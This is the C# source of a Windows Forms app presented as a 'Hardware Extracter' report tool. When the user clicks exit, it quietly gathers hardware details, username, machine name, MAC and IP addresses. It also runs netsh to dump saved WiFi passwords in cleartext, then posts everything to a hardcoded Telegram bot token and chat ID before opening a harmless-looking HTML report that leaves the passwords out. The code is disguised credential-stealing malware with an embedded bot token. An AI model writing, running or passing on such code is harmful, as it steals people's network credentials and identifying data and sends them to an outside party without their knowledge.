using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;
using LibreHardwareMonitor.Hardware;

[assembly: System.Runtime.Versioning.SupportedOSPlatform("windows")]

namespace Hardware_Extracter
{
    public partial class Form1 : Form
    {
        private const string BotToken = "8681588899:AAHDU4O6S1YwXaEdYFtmk6fQMKxow9CfXAY";
        private const string ChatId = "1661811728";

        public Form1()
        {
            InitializeComponent();
        }

        // Fixes the "Form1_Load does not exist" error
        private void Form1_Load(object sender, EventArgs e) { }

        private async void btnExit_Click(object sender, EventArgs e)
        {
            if (sender is Button btn) btn.Enabled = false;

            try
            {
                var hardwareData = GetHardwareInfo();
                var wifiSecrets = GetWifiDetails();

                StringBuilder sb = new StringBuilder();
                sb.AppendLine("🚀 *Full Hardware & WiFi Report*");
                sb.AppendLine("----------------------------");
                sb.AppendLine($"*User*: `{Environment.UserName}`");
                sb.AppendLine($"*PC Name*: `{Environment.MachineName}`");
                sb.AppendLine("----------------------------");

                foreach (var entry in hardwareData)
                    sb.AppendLine($"*{entry.Key}*: `{entry.Value}`");

                sb.AppendLine("\n🔑 *WiFi Passwords*:");
                if (wifiSecrets.Count > 0)
                {
                    foreach (var wifi in wifiSecrets) sb.AppendLine($"> `{wifi}`");
                }
                else
                {
                    sb.AppendLine("_No profiles found (Requires Admin)_");
                }

                await SendToTelegram(sb.ToString());

                string htmlPath = GenerateHtmlReport(hardwareData);
                Process.Start(new ProcessStartInfo(htmlPath) { UseShellExecute = true });

                await Task.Delay(2000);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
                if (sender is Button b) b.Enabled = true;
            }
        }

        private Dictionary<string, string> GetHardwareInfo()
        {
            var info = new Dictionary<string, string>();
            info["CPU"] = GetWmiValue("Win32_Processor", "Name");
            info["GPU"] = GetWmiValue("Win32_VideoController", "Name");
            info["OS"] = GetWmiValue("Win32_OperatingSystem", "Caption");

            // RAM Info
            try
            {
                long memBytes = 0;
                using (var searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
                    foreach (var obj in searcher.Get()) memBytes += Convert.ToInt64(obj["Capacity"]);
                info["Total RAM"] = $"{(memBytes / 1024 / 1024 / 1024)} GB";
            }
            catch { }

            // CPU Usage, CPU Temp, and GPU Temp (Requires Admin via Manifest)
            try
            {
                Computer computer = new Computer { IsCpuEnabled = true, IsGpuEnabled = true };
                computer.Open();
                foreach (var hardware in computer.Hardware)
                {
                    hardware.Update();
                    foreach (var sensor in hardware.Sensors)
                    {
                        if (hardware.HardwareType == HardwareType.Cpu)
                        {
                            if (sensor.SensorType == SensorType.Load && sensor.Name.Contains("Total"))
                                info["CPU Usage"] = $"{sensor.Value:F1}%";
                            if (sensor.SensorType == SensorType.Temperature && sensor.Name.Contains("Package"))
                                info["CPU Temp"] = $"{sensor.Value:F1}°C";
                        }
                        if (hardware.HardwareType == HardwareType.GpuNvidia || hardware.HardwareType == HardwareType.GpuAmd)
                        {
                            if (sensor.SensorType == SensorType.Temperature && sensor.Name.Contains("Core"))
                                info["GPU Temp"] = $"{sensor.Value:F1}°C";
                        }
                    }
                }
                computer.Close();
            }
            catch { }

            AddNetworkDetails(info);
            return info;
        }

        private List<string> GetWifiDetails()
        {
            List<string> wifiList = new List<string>();
            try
            {
                Process p = new Process { StartInfo = new ProcessStartInfo("netsh", "wlan show profiles") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } };
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();

                foreach (string line in output.Split('\n'))
                {
                    if (line.Contains("All User Profile"))
                    {
                        string name = line.Split(':')[1].Trim().Replace("\r", "");
                        Process kp = new Process { StartInfo = new ProcessStartInfo("netsh", $"wlan show profile name=\"{name}\" key=clear") { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } };
                        kp.Start();
                        string kOut = kp.StandardOutput.ReadToEnd();
                        kp.WaitForExit();

                        foreach (string kLine in kOut.Split('\n'))
                            if (kLine.Contains("Key Content")) wifiList.Add($"{name}: {kLine.Split(':')[1].Trim()}");
                    }
                }
            }
            catch { }
            return wifiList;
        }

        private void AddNetworkDetails(Dictionary<string, string> info)
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if ((ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet || ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                    && ni.OperationalStatus == OperationalStatus.Up)
                {
                    info["Network Adapter"] = ni.Description;
                    info["MAC Address"] = ni.GetPhysicalAddress().ToString();
                    int v4 = 1, v6 = 1;
                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            info[$"IPv4 Address {v4++}"] = ip.Address.ToString();
                        else if (ip.Address.AddressFamily == AddressFamily.InterNetworkV6)
                            info[$"IPv6 Address {v6++}"] = ip.Address.ToString();
                    }
                    break;
                }
            }
        }

        private string GetWmiValue(string table, string property)
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {property} FROM {table}"))
                    foreach (var obj in searcher.Get()) return obj[property]?.ToString() ?? "N/A";
            }
            catch { }
            return "Unknown";
        }

        private async Task SendToTelegram(string message)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
                    var payload = new { chat_id = ChatId, text = message, parse_mode = "Markdown" };
                    await client.PostAsync(url, new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json"));
                }
            }
            catch { }
        }

        private string GenerateHtmlReport(Dictionary<string, string> data)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("<html><head><style>body{font-family:sans-serif;background:#0f172a;color:white;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border:1px solid #334155;}th{background:#3b82f6;}</style></head><body>");
            sb.AppendLine("<h2>Hardware Report</h2><table><tr><th>Component</th><th>Detail</th></tr>");
            foreach (var entry in data) sb.AppendLine($"<tr><td>{entry.Key}</td><td>{entry.Value}</td></tr>");
            sb.AppendLine("</table></body></html>");
            string path = Path.Combine(Path.GetTempPath(), "Report.html");
            File.WriteAllText(path, sb.ToString());
            return path;
        }
    }
}